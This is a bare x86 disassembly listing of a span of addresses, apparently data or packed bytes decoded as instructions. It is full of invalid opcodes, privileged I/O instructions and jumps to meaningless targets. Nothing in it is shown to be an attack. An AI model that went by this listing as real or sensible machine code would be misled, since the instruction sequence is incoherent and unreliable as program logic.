  424e19:	and    eax,0x808b7780
  424e1e:	lock mov edx,DWORD PTR [ebx-0x4]
  424e22:	in     eax,dx
  424e23:	add    eax,0xc86b20d
  424e28:	mov    dl,0xba
  424e2a:	sub    edi,edi
  424e2c:	mov    dl,0x50
  424e2e:	ja     0x424ddf
  424e30:	adc    BYTE PTR [edi-0x796c64db],0x3
  424e37:	enter  0x4d4d,0x4f
  424e3b:	push   0x9
  424e3d:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424e44:	and    eax,0x86932a80
  424e49:	sub    eax,0x4f4d4dc8
  424e4e:	push   0x9
  424e50:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424e57:	and    eax,0x94802a80
  424e5c:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424e62:	push   0x9
  424e64:	mov    cr1,ebp
  424e67:	lea    ecx,[ebp-0x6e796c65]
  424e6d:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e70:	dec    edi
  424e71:	push   0x9
  424e73:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e7a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e81:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e87:	lea    eax,[ecx]
  424e89:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e90:	lock and DWORD PTR [ebp-0x62],ecx
  424e94:	xchg   ebp,eax
  424e95:	xchg   ebx,eax
  424e96:	dec    ebp
  424e97:	or     ah,BYTE PTR ds:0x3a82ce80
  424e9d:	lea    ecx,[ebp-0x27f7280]
  424ea3:	push   ebx
  424ea4:	push   ecx
  424ea5:	in     eax,dx
  424ea6:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424eac:	test   BYTE PTR [ecx],ch
  424eae:	(bad)  
  424eaf:	std    
  424eb0:	aad    0x0
  424eb2:	jl     0x424f2b
  424eb4:	out    dx,eax
  424eb5:	mul    BYTE PTR [ebx]
  424eb7:	outs   dx,DWORD PTR ds:[esi]
  424eb8:	cmp    BYTE PTR [eax-0xf7f1089],al
  424ebe:	out    dx,eax
  424ebf:	xor    BYTE PTR [edi+0x25],0xb2
  424ec3:	mov    esi,0xc405a20c
  424ec8:	hlt    
  424ec9:	lea    ecx,[ebp+0x197d30b9]
  424ecf:	sub    BYTE PTR [ebp+0x3d],0x80
  424ed3:	lock sub eax,0x925074ec
  424ed9:	adc    eax,0x7c2d7780
  424ede:	(bad)  
  424edf:	in     al,dx
  424ee0:	lea    ecx,[ebp+0x2d77808d]
  424ee6:	push   eax
  424ee7:	popf   
  424ee8:	out    dx,al
  424ee9:	xor    BYTE PTR [edi+0x71],0x80
  424eed:	lock sub eax,0x80ef9250
  424ef3:	ja     0x424f0a
  424ef5:	xor    al,0x2d
  424ef8:	push   eax
  424ef9:	xchg   edx,eax
  424efa:	and    esp,eax
  424efc:	adc    eax,0x80257780
  424f01:	ins    DWORD PTR es:[edi],dx
  424f02:	cmp    eax,0xec2df080
  424f07:	je     0x424f59
  424f09:	xchg   edx,eax
  424f0a:	adc    eax,0xed2d7780
  424f0f:	sub    eax,0xf7777c8d
  424f14:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424f1a:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424f24:	or     al,0x53
  424f26:	push   0xffffffab
  424f28:	test   eax,0x8d25fb70
  424f2d:	xchg   edi,eax
  424f2e:	add    BYTE PTR [edi+0x5c099696],0x92
  424f35:	adc    eax,0x1def7501
  424f3a:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424f3e:	xchg   ebx,eax
  424f3f:	fwait
  424f40:	jl     0x424fb9
  424f42:	mov    dh,dh
  424f44:	and    al,0x6f
  424f46:	cmp    BYTE PTR [eax-0x10],dl
  424f49:	mov    ecx,DWORD PTR [edi+0x70]
  424f4c:	aad    0xb5
  424f4e:	icebp  
  424f4f:	and    ah,BYTE PTR [edi+ebp*2]
  424f52:	cmp    BYTE PTR [eax-0x187fde83],al
  424f58:	out    dx,eax
  424f59:	in     al,dx
  424f5a:	retf   
  424f5b:	pop    edi
  424f5c:	out    0x21,eax
  424f5e:	in     al,0xcf
  424f60:	sbb    ch,0xef
  424f63:	in     al,dx
  424f64:	retf   
  424f65:	in     al,dx
  424f66:	out    0xef,eax
  424f68:	pop    edi
  424f69:	out    0x21,eax
  424f6b:	in     al,0x7b
  424f6d:	xor    al,0x8a
  424f70:	and    bh,0x8a
  424f73:	push   ebx
  424f74:	(bad)  
  424f75:	in     eax,dx
  424f76:	dec    ebx
  424f77:	or     eax,0x8029bcb2
  424f7c:	mov    al,ds:0xff0cc4b2
  424f81:	push   es
  424f82:	in     eax,dx
  424f83:	mov    edx,0xeeb2ed8a
  424f88:	in     eax,dx
  424f89:	push   0x3d
  424f8b:	jnp    0x424f3f
  424f8d:	popa   
  424f8e:	sub    edi,edi
  424f90:	retf   
  424f91:	mov    ds:0x6f24f64b,al
  424f96:	cmp    BYTE PTR [edx],bh
  424f98:	out    0x8a,eax
  424f9a:	xor    al,0x8a
  424f9d:	and    bh,0x8a
  424fa0:	push   ebx
  424fa1:	(bad)  
  424fa2:	in     eax,dx
  424fa3:	dec    ebx
  424fa4:	or     eax,0xb20cbeb2
  424fa9:	mov    esp,0x632aff29
  424fae:	lock mov esp,esp
  424fb1:	dec    edx
  424fb2:	push   ebx
  424fb3:	push   0xffffffab
  424fb5:	mov    ds:0x8deffb70,eax
  424fba:	xchg   edi,eax
  424fbb:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424fc2:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424fc9:	stc    
  424fca:	in     al,dx
  424fcb:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424fd2:	ror    BYTE PTR [ebp-0x74888373],cl
  424fd8:	call   0x8a77:0x7c8dee71
  424fdf:	stc    
  424fe0:	lods   eax,DWORD PTR ds:[esi]
  424fe1:	lea    ecx,[ebp-0x5088884]
  424fe7:	dec    DWORD PTR [ebp+0x7a777c8d]
  424fed:	dec    ebx
  424fee:	aam    0x8d
  424ff0:	lea    edi,[edi+esi*2-0x7e]
  424ff4:	in     al,dx
  424ff5:	lea    ecx,[ebp-0x79888373]
  424ffb:	mov    dl,0xb9
  424ffd:	lea    ecx,[ebp-0x7f788884]
  425003:	xchg   esi,eax
  425004:	lea    ecx,[ebp+0x332777c]
  42500a:	mov    bh,0x8d
  42500c:	lea    eax,[eax-0x73a17510]
  425012:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  425018:	lock mov edx,DWORD PTR [ebx+0x72]
  42501c:	dec    ebx
  42501d:	add    eax,0xfd809b99
  425022:	mov    ds:0x8d90f1ba,al
  425027:	lea    esp,[edx-0x7238d090]
  42502d:	lea    esp,[edx-0x725a2bfb]
  425033:	lea    esp,[edx-0x72c2204e]
  425039:	lea    edi,[edi+esi*2-0x38]
  42503d:	div    eax
  42503f:	lea    ecx,[ebp-0x24758884]
  425045:	aad    0x8d
  425047:	lea    edi,[edi+esi*2-0x75]
  42504b:	sbb    DWORD PTR [ecx-0x73],esi
  42504e:	lea    eax,[eax-0x687f7489]
  425054:	mov    dh,BYTE PTR [edi]
  425056:	dec    ecx
  425057:	popf   
  425058:	lea    ecx,[ebp+0x77ecfb53]
  42505e:	enter  0xb680,0x57
  425062:	jnp    0x425071
  425064:	lea    ecx,[ebp-0x68af08bd]
  42506a:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425070:	out    dx,eax
  425071:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425078:	nop
  425079:	adc    BYTE PTR [ecx-0x80],dh
  42507c:	ja     0x4250b0
  42507e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425085:	lea    edx,[ebx-0x5]
  425088:	adc    BYTE PTR [edi-0xe04007a],0x3
  42508f:	(bad)  [ebp-0x7f08bc73]
  425095:	ja     0x425090
  425097:	in     al,dx
  425098:	(bad)  
  425099:	icebp  
  42509a:	test   al,0x55
  42509c:	lea    ecx,[ebp-0x681308bd]
  4250a2:	test   BYTE PTR [eax-0x287f7c89],al
  4250a8:	jno    0x42502a
  4250aa:	out    0x82,eax
  4250ac:	mov    ds:0x8d9630c2,al
  4250b1:	lea    esi,[ebx]
  4250b3:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  4250bd:	inc    ebx
  4250be:	ret    0x7253
  4250c1:	dec    ebx
  4250c2:	dec    ebx
  4250c3:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  4250ca:	lea    esi,[ebx]
  4250cc:	sti    
  4250cd:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  4250d4:	fmul   DWORD PTR [ebp+0x97e638d]
  4250da:	dec    esp
  4250db:	mov    ds:0xab4d4d4d,eax
  4250e0:	test   eax,0x8d21fb70
  4250e5:	xchg   edi,eax
  4250e6:	add    BYTE PTR [edi-0x6c8a7813],0x99
  4250ed:	fwait
  4250ee:	jl     0x425167
  4250f0:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  4250f7:	xor    dl,al
  4250f9:	jg     0x425088
  4250fb:	lea    edi,[edi+esi*2-0x38]
  4250ff:	pusha  
  425100:	xchg   esi,eax
  425101:	lea    ecx,[ebp-0x15748884]
  425107:	xchg   esi,eax
  425108:	lea    ecx,[ebp-0xd758884]
  42510e:	sub    eax,0x777c8d8d
  425113:	sbb    ecx,0x59
  425116:	lea    ecx,[ebp+0x7784777c]
  42511c:	out    dx,al
  42511d:	lea    ecx,[ebp+0x6df9777c]
  425123:	xor    DWORD PTR [ebp-0x79888373],ecx
  425129:	sbb    ebx,DWORD PTR [edi-0x73]
  42512c:	lea    edi,[edi+esi*2+0x66]
  425130:	pop    esp
  425131:	leave  
  425132:	lea    ecx,[ebp-0x59958884]
  425138:	lea    ecx,[ebp+0x76777c8d]
  42513e:	iret   
  42513f:	cmp    DWORD PTR [ebp-0x2888373],ecx
  425145:	and    BYTE PTR [ecx],ch
  425147:	lea    ecx,[ebp+0x5caf777c]
  42514d:	iret   
  42514e:	lea    ecx,[ebp-0x1a088884]
  425154:	sbb    eax,0x77808d8d
  425159:	test   BYTE PTR [eax-0x55307c10],al
  42515f:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  425165:	lea    ecx,[ebp-0x72dcdf31]
  42516b:	lea    ecx,[ecx]
  42516d:	and    dh,BYTE PTR [edx+0x7f549e60]
  425173:	mov    eax,DWORD PTR [ebx-0x3]
  425176:	xor    BYTE PTR [edi-0x76],0x80
  42517a:	xchg   edi,eax
  42517b:	mov    esi,DWORD PTR [ebx]
  42517d:	sti    
  42517e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425185:	lea    eax,[ebx-0x5]
  425188:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42518f:	xchg   edi,edi
  425191:	sti    
  425192:	push   ebx
  425193:	jb     0x42518f
  425195:	pushf  
  425196:	ins    BYTE PTR es:[edi],dx
  425197:	dec    ebp
  425198:	dec    ebp
  425199:	dec    ebx
  42519a:	or     eax,DWORD PTR [eax-0x2f93de69]
  4251a0:	pop    ds
  4251a1:	lea    ecx,[ebp+0x7780f743]
  4251a7:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  4251ad:	or     DWORD PTR [edx],esp
  4251af:	cld    
  4251b0:	cli    
  4251b1:	mov    al,ds:0xbe309e50
  4251b6:	icebp  
  4251b7:	lea    ecx,[ebp+0x7a777c8d]
  4251bd:	sbb    al,0x55
  4251bf:	lea    ecx,[ebp+0x2e82777c]
  4251c5:	leave  
  4251c6:	lea    ecx,[ebp-0x327b8884]
  4251cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251cd:	lea    ecx,[ebp+0x3a83777c]
  4251d3:	lea    ecx,[ebp-0x7c587f73]
  4251d9:	push   ebx
  4251da:	jb     0x42523a
  4251dc:	fwait
  4251dd:	leave  
  4251de:	lea    ecx,[ebp-0x687f39b5]
  4251e4:	test   BYTE PTR [eax-0x4001059],al
  4251ea:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  4251f1:	jp     0x42522a
  4251f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f4:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  4251fe:	sub    eax,0x77508ade
  425203:	jp     0x425185
  425205:	ja     0x4251fe
  425207:	adc    BYTE PTR [edi+0xbc835af],0x7
  42520e:	adc    BYTE PTR [edi+0x4523357a],0x2f
  425215:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  42521c:	xor    BYTE PTR [edi-0x3],0xcf
  425220:	mov    es,edi
  425222:	lea    ecx,[ebp-0x7f898814]
  425228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425229:	push   0x53
  42522b:	jb     0x425278
  42522d:	mov    BYTE PTR [eax-0x639b9969],0x6c
  425234:	dec    ebp
  425235:	dec    ebp
  425236:	aaa    
  425237:	cmp    BYTE PTR [edi-0x73],dl
  42523a:	lea    eax,[ebx-0x5]
  42523d:	push   edi
  42523e:	adc    DWORD PTR [edx+0x4d],ebp
  425241:	dec    ebp
  425242:	in     al,dx
  425243:	std    
  425244:	xor    BYTE PTR [edi-0x76],0x80
  425248:	xchg   edi,eax
  425249:	mov    esi,DWORD PTR [ebx]
  42524b:	sti    
  42524c:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425253:	lea    eax,[ebx-0x5]
  425256:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42525d:	xchg   edi,edi
  42525f:	sti    
  425260:	push   ebx
  425261:	jb     0x4252ae
  425263:	mov    BYTE PTR [eax-0x8bcde69],0x80
  42526a:	ja     0x4251f2
  42526c:	and    BYTE PTR [edi+0x97c43f9],0x22
  425273:	je     0x4251f5
  425275:	mov    al,ds:0x4ec8243
  42527a:	arpl   WORD PTR [ebx],ax
  42527c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425280:	dec    ebp
  425281:	dec    ebp
  425282:	stos   DWORD PTR es:[edi],eax
  425283:	test   eax,0xeffb70a3
  425288:	lea    edx,[edi-0x78127880]
  42528e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425292:	in     al,0x58
  425294:	fist   WORD PTR [ecx]
  425296:	pop    esi
  425297:	xchg   BYTE PTR [edi+0x77502643],cl
  42529d:	push   esi
  42529e:	jl     0x425317
  4252a0:	pop    esi
  4252a1:	loop   0x4252fb
  4252a3:	fist   WORD PTR [ecx]
  4252a5:	push   eax
  4252a6:	ja     0x42530e
  4252a8:	jl     0x425321
  4252aa:	push   0xffffffe6
  4252ac:	pop    eax
  4252ad:	fist   WORD PTR [ecx]
  4252af:	push   eax
  4252b0:	ja     0x425328
  4252b2:	xchg   ebx,eax
  4252b3:	jl     0x42532c
  4252b5:	std    
  4252b6:	rcr    BYTE PTR [eax-0x21],1
  4252b9:	adc    DWORD PTR [eax+0x77],edx
  4252bc:	scas   eax,DWORD PTR es:[edi]
  4252bd:	cdq    
  4252be:	fwait
  4252bf:	jl     0x425338
  4252c1:	neg    DWORD PTR [ecx+0x5011df58]
  4252c7:	ja     0x425343
  4252c9:	push   ebx
  4252ca:	jb     0x42531f
  4252cc:	dec    ebp
  4252cd:	pusha  
  4252ce:	mul    BYTE PTR [edi+ebp*2]
  4252d1:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4252d5:	call   0x7b543232
  4252da:	push   eax
  4252db:	ja     0x425260
  4252dd:	xor    BYTE PTR [edx+0x50879750],0xe7
  4252e4:	stc    
  4252e5:	add    DWORD PTR [esi+0xd32ed3a],ebx
  4252eb:	mov    dl,0x84
  4252ed:	sub    edi,edi
  4252ef:	sti    
  4252f0:	add    DWORD PTR [ebp+0x78],esi
  4252f3:	bound  eax,QWORD PTR [eax-0x11627f8f]
  4252f9:	or     DWORD PTR [esi+0x3],eax
  4252fc:	or     al,0xb2
  4252fe:	les    ecx,FWORD PTR [eax+eax*4]
  425301:	sbb    eax,0x53ee6d80
  425306:	push   0xffffffa2
  425308:	ret    0xc7a7
  42530b:	add    al,0xd4
  42530d:	push   edi
  42530f:	push   eax
  425310:	xchg   edi,eax
  425311:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  425317:	mov    dl,0xb4
  425319:	sub    DWORD PTR [ebx+0x77],esp
  42531c:	and    DWORD PTR [ecx],ecx
  42531e:	into   
  42531f:	lea    ecx,fs:[ebp-0x74887f73]
  425326:	in     eax,dx
  425327:	mov    bh,0x86
  425329:	lea    edx,[eax-0x19]
  42532c:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  425332:	aad    0xb7
  425334:	push   ebx
  425335:	push   0x50
  425337:	out    0xc8,eax
  425339:	adc    BYTE PTR [edi-0x10587f7a],0x1
  425340:	gs jno 0x4252c3
  425343:	xchg   edi,eax
  425344:	out    dx,eax
  425345:	in     al,dx
  425346:	pushf  
  425347:	push   eax
  425348:	xchg   edi,eax
  425349:	test   BYTE PTR [edi+0x4d971090],cl
  42534f:	adc    BYTE PTR [edi-0x70631375],0x15
  425356:	mov    al,0x80
  425358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425359:	test   BYTE PTR [eax],dl
  42535b:	adc    ecx,DWORD PTR [edi-0x587fb269]
  425361:	mov    ebp,esp
  425363:	lods   al,BYTE PTR ds:[esi]
  425364:	and    bh,0xef
  425367:	adc    BYTE PTR ds:0xc8978063,dl
  42536d:	ins    DWORD PTR es:[edi],dx
  42536e:	in     eax,dx
  42536f:	clc    
  425370:	mov    dh,BYTE PTR [edx-0x412d67a]
  425376:	out    dx,al
  425377:	(bad)  
  425378:	sti    
  425379:	push   ebx
  42537a:	mov    dl,0x50
  42537c:	ja     0x425346
  42537e:	outs   dx,BYTE PTR ds:[esi]
  42537f:	xlat   BYTE PTR ds:[ebx]
  425380:	enter  0x9780,0xc8
  425384:	in     eax,dx
  425385:	xor    cl,BYTE PTR ds:0xb20c07b2
  42538b:	test   BYTE PTR [ecx],ch
  42538d:	(bad)  
  42538e:	sti    
  42538f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425396:	push   ebx
  425397:	dec    ebp
  425398:	jnp    0x42531a
  42539a:	ja     0x4253ce
  42539c:	adc    BYTE PTR [edi-0x79587f75],0xed
  4253a3:	test   BYTE PTR [edx-0x7f0811ff],cl
  4253a9:	xchg   edi,eax
  4253aa:	mov    eax,DWORD PTR [ecx]
  4253ac:	adc    eax,0x21a78093
  4253b1:	mov    dl,0x7
  4253b3:	sub    edi,edi
  4253b5:	sti    
  4253b6:	push   ebx
  4253b7:	mov    dl,0x50
  4253b9:	ja     0x4253ed
  4253bb:	outs   dx,BYTE PTR ds:[esi]
  4253bc:	xlat   BYTE PTR ds:[ebx]
  4253bd:	xor    al,BYTE PTR [eax+0x32ed3297]
  4253c3:	or     eax,0xb20c07b2
  4253c8:	test   BYTE PTR [ecx],ch
  4253ca:	(bad)  
  4253cb:	sti    
  4253cc:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  4253d3:	push   eax
  4253d4:	ja     0x42535c
  4253d6:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  4253da:	leave  
  4253db:	dec    ebp
  4253dc:	dec    ebp
  4253dd:	dec    ebp
  4253de:	xor    BYTE PTR [edi-0x79],0x80
  4253e2:	xchg   edi,eax
  4253e3:	stc    
  4253e4:	in     eax,dx
  4253e5:	clc    
  4253e6:	mov    ch,BYTE PTR [ebp-0x13]
  4253e9:	sti    
  4253ea:	out    dx,al
  4253eb:	mov    dl,0x86
  4253ed:	sub    edi,edi
  4253ef:	sti    
  4253f0:	push   ebx
  4253f1:	mov    dl,0x80
  4253f3:	add    BYTE PTR [eax-0x1281ac09],0xc6
  4253fa:	or     eax,0x5029b4b2
  4253ff:	xchg   edi,eax
  425400:	stc    
  425401:	mov    dl,0x7
  425403:	or     al,0x50
  425405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425406:	xchg   DWORD PTR [eax],esi
  425408:	xchg   edi,eax
  425409:	xchg   ebp,ebp
  42540b:	out    0x87,eax
  42540d:	outs   dx,DWORD PTR ds:[esi]
  42540e:	or     edx,ebp
  425410:	jp     0x42541f
  425412:	dec    ebp
  425413:	dec    ebp
  425414:	stos   DWORD PTR es:[edi],eax
  425415:	test   eax,0xeffb70a3
  42541a:	lea    edx,[edi-0x78127880]
  425420:	adc    eax,0x7cef7780
  425425:	ja     0x425459
  425427:	mul    BYTE PTR [edi+ebp*2]
  42542a:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  42542e:	cmc    
  42542f:	and    al,0x6f
  425431:	cmp    BYTE PTR [eax+0x5099938d],al
  425437:	ja     0x4253c4
  425439:	jl     0x4254b2
  42543b:	enter  0x24dc,0x6f
  42543f:	cmp    BYTE PTR [ebx+0x4787777c],bl
  425445:	sbb    al,0xf9
  425447:	adc    eax,DWORD PTR [eax-0xf7f7529]
  42544d:	mov    ah,dl
  42544f:	or     eax,0x6f24225e
  425454:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  42545a:	sub    DWORD PTR [ebx+0x32],edx
  42545d:	mov    dl,0x88
  42545f:	or     al,0xff
  425461:	add    eax,0x8032f080
  425466:	xchg   edi,eax
  425467:	xor    dl,BYTE PTR [ebx-0x3]
  42546a:	push   ebx
  42546b:	pushf  
  42546c:	mov    dl,0xbe
  42546e:	or     al,0xb2
  425470:	clc    
  425471:	sub    edi,edi
  425473:	dec    BYTE PTR [ecx]
  425475:	and    al,BYTE PTR ds:0x8d8d24be
  42547b:	lea    eax,[eax-0x687f7410]
  425481:	mov    edx,DWORD PTR [ebx-0x64]
  425484:	mov    dl,0xf8
  425486:	sub    DWORD PTR [ebx-0x3],edx
  425489:	mov    dl,0xbe
  42548b:	or     al,0xff
  42548d:	inc    BYTE PTR [eax-0x587f7569]
  425493:	mov    dl,BYTE PTR [ebx-0x9]
  425496:	push   ebx
  425497:	lods   al,BYTE PTR ds:[esi]
  425498:	mov    dl,0x7
  42549a:	or     al,0xb2
  42549c:	mov    ah,0x29
  42549e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  4254a5:	xor    al,0x8b
  4254a8:	aad    0x59
  4254aa:	push   ebx
  4254ab:	sub    dh,BYTE PTR [edx-0x8acd646]
  4254b1:	mov    dl,0x7
  4254b3:	or     al,0xff
  4254b5:	mov    dh,0x80
  4254b7:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254be:	push   ebx
  4254bf:	lods   al,BYTE PTR ds:[esi]
  4254c0:	mov    dl,0xbe
  4254c2:	or     al,0xb2
  4254c4:	mov    ah,0x29
  4254c6:	call   DWORD PTR [ecx]
  4254c8:	xchg   esp,eax
  4254c9:	pop    es
  4254ca:	xor    al,0x87
  4254cd:	and    BYTE PTR [edi+0x53fd5387],0xac
  4254d4:	mov    dl,0xbe
  4254d6:	or     al,0xb2
  4254d8:	mov    ah,0x29
  4254da:	call   DWORD PTR [ecx]
  4254dc:	push   ebx
  4254dd:	mov    dh,0xc4
  4254df:	sub    eax,0xbab22a53
  4254e4:	sub    DWORD PTR [ebx-0x9],edx
  4254e7:	mov    dl,0x7
  4254e9:	or     al,0xff
  4254eb:	mov    dh,0x80
  4254ed:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254f4:	push   ebx
  4254f5:	lods   al,BYTE PTR ds:[esi]
  4254f6:	mov    dl,0xbe
  4254f8:	or     al,0xb2
  4254fa:	mov    ah,0x29
  4254fc:	call   DWORD PTR [ecx]
  4254fe:	xchg   esp,eax
  4254ff:	pop    es
  425500:	push   eax
  425501:	xchg   edi,eax
  425502:	mov    eax,DWORD PTR [eax-0x687f7510]
  425508:	mov    dl,BYTE PTR [ebx-0x3]
  42550b:	push   ebx
  42550c:	pushf  
  42550d:	mov    dl,0xbe
  42550f:	or     al,0xb2
  425511:	clc    
  425512:	sub    edi,edi
  425514:	(bad)  
  425515:	in     al,dx
  425516:	add    eax,0x80c8f080
  42551b:	xchg   edi,eax
  42551c:	enter  0x9c53,0x53
  425520:	std    
  425521:	mov    dl,0xf8
  425523:	sub    DWORD PTR [edx-0x100f342],esi
  425529:	adc    BYTE PTR [edi-0x75587f76],0x53
  425530:	not    DWORD PTR [ebx-0x54]
  425533:	mov    dl,0xb4
  425535:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  42553b:	inc    ebx
  42553c:	(bad)  
  42553d:	arpl   WORD PTR ds:0x4d5b4c09,ax
  425543:	dec    ebp
  425544:	dec    ebp
  425545:	xor    BYTE PTR [edi-0x75],0x80
  425549:	lock out dx,eax
  42554b:	stos   DWORD PTR es:[edi],eax
  42554c:	test   eax,0x77803a50
  425551:	mov    esp,DWORD PTR [ebx-0x72110490]
  425557:	xchg   edi,eax
  425558:	add    BYTE PTR [edi+0x70539696],0x5f
  42555f:	lock and ebp,edx
  425562:	in     eax,0x5f
  425564:	lock out dx,eax
  425566:	(bad)  
  425568:	(bad)  
  425569:	out    dx,al
  42556a:	outs   dx,BYTE PTR ds:[esi]
  42556b:	adc    BYTE PTR [edi+0x9],dh
  42556e:	cld    
  42556f:	ja     0x42553d
  425571:	aad    0xfc
  425573:	ja     0x425582
  425575:	sbb    esp,edi
  425577:	ja     0x4255c6
  425579:	ror    BYTE PTR [ecx],1
  42557b:	loopne 0x4255f4
  42557d:	dec    ebp
  42557e:	or     eax,esp
  425580:	xchg   edi,eax
  425581:	or     eax,0x8d8d7acf
  425586:	lea    esi,[ebx]
  425588:	sti    
  425589:	or     eax,esp
  42558b:	xchg   edi,eax
  42558c:	int3   
  42558d:	xor    edi,ebx
  42558f:	adc    BYTE PTR [edi-0x7b],dh
  425592:	cld    
  425593:	ja     0x42559b
  425595:	or     eax,0xd48a77fc
  42559a:	cld    
  42559b:	ja     0x4255ea
  42559d:	jl     0x42559b
  42559f:	ja     0x4255ae
  4255a1:	sar    esp,cl
  4255a3:	ja     0x425571
  4255a5:	push   esp
  4255a6:	(bad)  
  4255a7:	ja     0x425575
  4255a9:	(bad)  
  4255aa:	xchg   edi,eax
  4255ab:	or     eax,0x978ffba6
  4255b0:	dec    ebp
  4255b1:	sar    bl,cl
  4255b3:	(bad)  
  4255b4:	xchg   edi,eax
  4255b5:	mov    cl,BYTE PTR [ebx]
  4255b7:	pop    es
  4255b8:	(bad)  
  4255b9:	xchg   edi,eax
  4255ba:	push   es
  4255bb:	sar    bl,cl
  4255bd:	(bad)  
  4255be:	xchg   edi,eax
  4255bf:	test   esi,edx
  4255c1:	neg    ebx
  4255c3:	or     DWORD PTR [ecx],ecx
  4255c5:	loopne 0x42563e
  4255c7:	or     DWORD PTR [edi+0x8],eax
  4255ca:	lea    ecx,[ebp+0x977108d]
  4255d0:	div    eax
  4255d2:	or     DWORD PTR [edi-0x11eff689],ecx
  4255d8:	outs   dx,BYTE PTR ds:[esi]
  4255d9:	xchg   edx,eax
  4255da:	arpl   ax,si
  4255dc:	out    dx,eax
  4255dd:	in     al,0x50
  4255df:	dec    ebp
  4255e0:	xlat   BYTE PTR ds:[ebx]
  4255e1:	out    dx,eax
  4255e2:	cdq    
  4255e3:	xchg   BYTE PTR [edx-0x76],cl
  4255e6:	dec    ebp
  4255e7:	dec    ebp
  4255e8:	jo     0x4255e5
  4255ea:	out    dx,eax
  4255eb:	lea    edx,[edi-0x785d7880]
  4255f1:	cmp    eax,0x938d8dee
  4255f6:	cdq    
  4255f7:	mul    BYTE PTR fs:[edi+ebp*2]
  4255fb:	cmp    BYTE PTR [eax-0x59],dl
  4255fe:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  425602:	cmc    
  425603:	and    al,0x6f
  425605:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  425609:	imul   BYTE PTR [edi+ebp*2]
  42560c:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  425610:	xchg   esi,eax
  425611:	mov    ch,0xcb
  425613:	scas   al,BYTE PTR es:[edi]
  425614:	xor    BYTE PTR [edi+0x32],0x80
  425618:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  42561f:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  425625:	mov    dl,0x86
  425627:	or     al,0xb2
  425629:	mov    edx,0x50b2ff29
  42562e:	ja     0x4255bb
  425630:	jl     0x4256a9
  425632:	sbb    esp,0x24
  425635:	outs   dx,DWORD PTR ds:[esi]
  425636:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  42563a:	inc    edi
  42563b:	sbb    al,0xf9
  42563d:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  425641:	out    dx,eax
  425642:	lea    ecx,[ebp-0x7f8f7f73]
  425648:	ja     0x4255d4
  42564a:	xor    al,0x8a
  42564d:	push   ebx
  42564e:	sub    dh,BYTE PTR [edx-0x3acd646]
  425654:	mov    dl,0x86
  425656:	or     al,0xff
  425658:	mov    dl,0x80
  42565a:	lock xor al,BYTE PTR [eax+0x51533297]
  425661:	push   ebx
  425662:	pushf  
  425663:	mov    dl,0xbe
  425665:	or     al,0xb2
  425667:	clc    
  425668:	sub    edi,edi
  42566a:	dec    BYTE PTR [ecx]
  42566c:	and    dh,BYTE PTR [edx+0x778092c4]
  425672:	enter  0xf080,0xc8
  425676:	mov    dl,0x86
  425678:	sub    DWORD PTR [edx-0x4d00f346],esi
  42567e:	push   ebx
  42567f:	je     0x4256d1
  425681:	ja     0x42560e
  425683:	add    DWORD PTR [edi-0x75],esi
  425686:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42568c:	push   eax
  42568d:	ja     0x42561a
  42568f:	xor    BYTE PTR [edi-0x75],0x80
  425693:	lock enter 0xf50,0x1
  425698:	add    BYTE PTR [esi],0x4d
  42569b:	dec    ebp
  42569c:	xor    BYTE PTR [edi-0x76],0x80
